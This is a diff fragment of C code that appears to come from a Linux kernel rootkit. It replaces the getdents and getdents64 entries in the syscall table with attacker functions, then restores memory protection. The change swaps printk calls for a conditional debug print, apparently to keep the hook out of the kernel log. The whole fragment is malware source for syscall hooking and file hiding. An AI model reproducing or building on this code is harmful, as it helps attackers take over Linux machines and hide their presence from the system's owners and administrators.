@@ -133,13 +133,13 @@ void hijack_getdents(void)
 
     orig_getdents = (sysfun_t)syscall_table[__NR_getdents];
     orig_getdents64 = (sysfun_t)syscall_table[__NR_getdents64];
-    printk(KERN_INFO "orig_getdents @ %p", orig_getdents);
-    printk(KERN_INFO "orig_getdents64 @ %p", orig_getdents64);
+    m_printd(KERN_INFO "orig_getdents @ %p", orig_getdents);
+    m_printd(KERN_INFO "orig_getdents64 @ %p", orig_getdents64);
 
     syscall_table[__NR_getdents] = (uint64_t)new_getdents;
     syscall_table[__NR_getdents64] = (uint64_t)new_getdents64;
-    printk(KERN_INFO "Hooked getdents(), new getdents @ %p", &syscall_table[__NR_getdents]);
-    printk(KERN_INFO "Hooked getdents64(), new getdents64 @ %p", &syscall_table[__NR_getdents64]);
+    m_printd(KERN_INFO "Hooked getdents(), new getdents @ %p", &syscall_table[__NR_getdents]);
+    m_printd(KERN_INFO "Hooked getdents64(), new getdents64 @ %p", &syscall_table[__NR_getdents64]);
     protect_memory(old_cr0);
 }
 
